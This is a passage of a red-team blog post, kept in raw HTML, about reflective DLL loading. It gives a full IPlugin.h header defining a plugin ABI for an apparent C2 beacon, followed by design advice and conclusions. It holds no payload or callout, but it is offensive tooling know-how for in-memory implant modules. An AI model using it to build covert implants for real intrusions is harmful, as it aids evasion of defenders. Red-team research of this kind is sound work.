leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Clean up handles and free buffers even on error paths.</p></div></li></ul><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h2 id="extensions" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#extensions"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_dt8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_dt8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Extensions</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Once the ABI is in place, adding modules is boring—in a good way:</p><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">init()</code> for per-module setup</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">execute(TaskApi*)</code> for the actual work</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">cleanup()</code> for teardown</p></div></li></ul><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The agent doesn’t need to know <i class="font-italic">how</i> you did it—only how to map, resolve, and call.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"></p><h3 id="iplugin.h" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#iplugin.h"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_e78qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_e78qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">IPlugin.h</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Here’s the full <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">IPlugin.h</code> you can standardize on:</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_6b8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">#pragma once<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#include &lt;Windows.h&gt;  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">#ifndef PLUGIN_CALL<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#define PLUGIN_CALL __stdcall<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#endif<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">#ifndef PLUGIN_EXPORT<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#define PLUGIN_EXPORT extern "C" __declspec(dllexport)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">#endif<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">typedef struct TaskApi {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; const char* TaskId; &nbsp; &nbsp; &nbsp; &nbsp;DWORD TaskIdLen;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; const char* Instruction; &nbsp; DWORD InstructionLen;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; const char* Command; &nbsp; &nbsp; &nbsp; DWORD CommandLen;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; const char* Arguments; &nbsp; &nbsp; DWORD ArgumentsLen;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; const char* File; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DWORD FileLen;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; const char* ExecTime; &nbsp; &nbsp; &nbsp;DWORD ExecTimeLen;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">} TaskApi;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">class IPlugin {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">public:<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; virtual void init() &nbsp; const = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; virtual void execute(TaskApi* task) const = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; virtual void cleanup() const = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; virtual ~IPlugin() = default;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">};<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">static inline DWORD CStrLenA(const char* s) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; return s ? (DWORD)lstrlenA(s) : 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">static void BeaconCout(const char* s, DWORD len = 0) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (!s) return;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (!hOut || hOut == INVALID_HANDLE_VALUE) return;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (len == 0) len = (DWORD)lstrlenA(s);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; DWORD n = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; WriteFile(hOut, s, len, &amp;n, nullptr);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">static void BeaconPipeOutput(HANDLE hRead) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; BYTE buf[4096];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; for (;;) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; DWORD got = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; if (!ReadFile(hRead, buf, sizeof(buf), &amp;got, nullptr) || got == 0) break;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; if (hOut &amp;&amp; hOut != INVALID_HANDLE_VALUE) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD wrote = 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; WriteFile(hOut, buf, got, &amp;wrote, nullptr);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">static inline void* PluginAlloc(SIZE_T sz, BOOL zero = TRUE) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; return HeapAlloc(GetProcessHeap(), zero ? HEAP_ZERO_MEMORY : 0, sz);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">static inline void &nbsp;PluginFree(void* p) {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; if (p) HeapFree(GetProcessHeap(), 0, p);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">PLUGIN_EXPORT IPlugin* PLUGIN_CALL create_plugin();<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">PLUGIN_EXPORT void &nbsp; &nbsp; PLUGIN_CALL destroy_plugin(IPlugin*);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">PLUGIN_EXPORT void &nbsp; &nbsp; PLUGIN_CALL plugin_init(IPlugin*);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">PLUGIN_EXPORT void &nbsp; &nbsp; PLUGIN_CALL plugin_exec(TaskApi* task);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">PLUGIN_EXPORT void &nbsp; &nbsp; PLUGIN_CALL plugin_cleanup(IPlugin*);</span></span></code></pre></div><!--/$--><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h2 id="going-forward" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#going-forward"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_ef8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_ef8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Going Forward</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">If you want this to scale without pain:</p><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Keep a single <strong class="font-bold">canonical header</strong> for the ABI and shared helpers.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Decide “CRT or no CRT” per module and document it.</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Be explicit about what your mapper supports (relocs/imports/protections) and what it doesn’t (TLS, delay-load, forwarded exports, CFG, SEH tables).</p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Add targeted tests (missing imports, weird sections, map/unmap cycles). Future-you will be grateful.<!-- --></p></div></li></ul><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h2 id="conclusions" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#conclusions"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_en8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_en8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Conclusions</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">If there’s a single lesson I’m taking away from this little adventure, it’s that “reflective loading” stops being a magic trick the moment you understand the moving parts. It’s just the PE lifecycle—headers, sections, relocations, imports, protections—played back on your own terms. That doesn’t make it trivial (I lost entire evenings to off-by-one bugs in relocation blocks and forgetting to set final page protections), but it does make it tractable. And once you can map a DLL from bytes reliably, a clean plugin ABI feels like the obvious next step rather than a leap of faith.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The second lesson is about restraint. It’s tempting to bolt every clever idea onto the mapper: TLS callbacks, delay-loads, forwarded exports, CFG tables, SEH registration, thread-local storage, the works. Ask me how I know. In practice, the small boring mapper that does the minimum well is the one you’ll trust to ship. Push anything module-specific into the modules. Keep the interface tight and predictable. When you need to extend it, extend it deliberately—prefer an extra field in your task struct over a one-off “special case” that only one module understands.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">There are tradeoffs worth calling out. Compared to BOFs, reflective DLLs can feel heavier and noisier; compared to regular DLLs, they can be brittle if your mapper only supports a subset of PE features. That’s okay—just be explicit about your contract. Document what your loader guarantees (relocs/imports/protections) and what it doesn’t (TLS, delay-load, forwarded exports). If a module needs something exotic, either teach the mapper that one new trick or reject the module early with a clear error. Silent half-support is the worst failure mode..</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Finally, a note on scope and responsibility. Techniques like these are powerful, and like most powerful things, they can be used in ways that help or harm. For my part, this work came out of curiosity about loaders, a desire to build smaller, more modular tooling, and a genuine love for understanding how Windows actually works under the hood. If you take anything from this post, let it be the craft: build carefully, measure honestly, write down the edges, and leave it cleaner than you found it.</p><hr class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 page-width-wide:max-w-full border-tint-subtle"><h2 id="references-for-further-reading" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://racoten.gitbook.io/red-team-developments-and-operations#references-for-further-reading"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_f38qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_f38qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">References (for further reading)</div></h2><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'•';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start"><strong class="font-bold">Stephen Fewer — Reflective DLL Injection (paper &amp; code)</strong></p><ul class="min-w-0 space-y-2 page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'◦';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Code: <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong 